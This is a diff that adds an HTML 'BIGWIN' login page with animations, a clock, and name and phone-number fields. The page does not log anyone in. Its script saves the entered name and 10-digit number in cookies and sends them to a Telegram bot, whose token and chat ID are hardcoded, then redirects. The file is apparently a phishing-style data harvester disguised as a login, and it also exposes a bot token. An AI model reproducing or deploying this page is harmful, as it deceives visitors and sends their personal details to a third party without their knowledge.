@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BIGWIN - Login</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+      }
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        background: linear-gradient(135deg, #1e90ff, #ff7f50);
+        overflow: hidden;
+      }
+
+      h1 {
+        font-size: 3rem;
+        color: #fff;
+        margin-bottom: 20px;
+        animation: fadeIn 1.5s forwards, bounce 1s infinite alternate;
+      }
+      @keyframes bounce {
+        from {
+          transform: translateY(0);
+        }
+        to {
+          transform: translateY(-10px);
+        }
+      }
+
+      .background-animation {
+        position: absolute;
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+        z-index: -1;
+      }
+      .background-animation span {
+        position: absolute;
+        display: block;
+        width: 60px;
+        height: 60px;
+        background: rgba(255, 255, 255, 0.15);
+        border-radius: 50%;
+        animation: animate 25s linear infinite;
+      }
+      @keyframes animate {
+        0% {
+          transform: scale(0) translateY(0);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(1) translateY(-100vh);
+          opacity: 0;
+        }
+      }
+
+      .login-box {
+        position: relative;
+        width: 350px;
+        padding: 40px;
+        background: #fff;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        border-radius: 10px;
+        text-align: center;
+        overflow: hidden;
+      }
+      .login-box h2 {
+        margin-bottom: 20px;
+        color: #333;
+      }
+      .login-box input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0 5px 0;
+        font-size: 18px;
+        text-align: center;
+        border: 2px solid #1e90ff;
+        border-radius: 5px;
+        outline: none;
+        transition: 0.3s;
+      }
+      .login-box input:focus {
+        border-color: #ff7f50;
+      }
+      .login-box button {
+        padding: 10px 20px;
+        font-size: 18px;
+        background-color: #1e90ff;
+        border: none;
+        color: #fff;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+      .login-box button:hover {
+        background-color: #ff7f50;
+      }
+      .error-message {
+        color: red;
+        font-size: 0.9rem;
+        margin-top: 5px;
+        display: none;
+      }
+      .clock {
+        font-size: 1.5rem;
+        color: #1e90ff;
+        margin-bottom: 10px;
+        animation: fadeIn 1s forwards;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <h1>BIGWIN</h1>
+    <div class="background-animation">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+
+    <div class="login-box">
+      <div class="clock" id="clock"></div>
+      <h2>Login</h2>
+      <input type="text" id="name" placeholder="Enter name" required />
+      <div class="error-message" id="name-error">Please enter a valid name.</div>
+      <input
+        type="text"
+        id="message"
+        placeholder="Enter number"
+        maxlength="10"
+        oninput="validateNumberInput(this)"
+        required
+      />
+      <div class="error-message" id="number-error">Please enter a 10-digit number.</div>
+      <button onclick="validateAndProcess()">Submit</button>
+    </div>
+
+    <script>
+      function updateClock() {
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = now.getMinutes().toString().padStart(2, '0');
+        const seconds = now.getSeconds().toString().padStart(2, '0');
+        const amPm = hours >= 12 ? 'PM' : 'AM';
+        hours = hours % 12 || 12;
+        const timeString = `${hours}:${minutes}:${seconds} ${amPm}`;
+        document.getElementById('clock').innerText = timeString;
+      }
+      setInterval(updateClock, 1000);
+
+      function validateNumberInput(input) {
+        input.value = input.value.replace(/[^0-9]/g, '');
+      }
+
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        const expires = "expires=" + date.toUTCString();
+        document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+      }
+
+      // Updated sendMessageToTelegram function with debugging
+      function sendMessageToTelegram(name, number) {
+        const chatId = "5786268361"; // Your Telegram chat ID
+        const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc"; // Your Telegram bot token
+        const message = `Name: ${name}\nNumber: ${number}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Log the URL to debug
+        console.log("Sending message to Telegram:", url);
+
+        fetch(url)
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.ok) {
+              console.log("Message sent successfully:", data);
+              window.location.href = "home.html"; // Redirect after success
+            } else {
+              console.error("Error sending message:", data);
+              alert("Error sending message: " + data.description);
+            }
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            alert("Failed to send message.");
+          });
+      }
+
+      function validateAndProcess() {
+        const name = document.getElementById('name').value.trim();
+        const message = document.getElementById('message').value;
+        const nameError = document.getElementById('name-error');
+        const numberError = document.getElementById('number-error');
+
+        let isValid = true;
+
+        if (!name) {
+          nameError.style.display = "block";
+          isValid = false;
+        } else {
+          nameError.style.display = "none";
+        }
+
+        if (message.length !== 10) {
+          numberError.style.display = "block";
+          isValid = false;
+        } else {
+          numberError.style.display = "none";
+        }
+
+        if (isValid) {
+          setCookie("userName", name, 7); // Store for 7 days
+          setCookie("userNumber", message, 7); // Store for 7 days
+
+          sendMessageToTelegram(name, message); // Send data to Telegram
+        }
+      }
+
+      updateClock();
+    </script>
+  </body>
+</html>
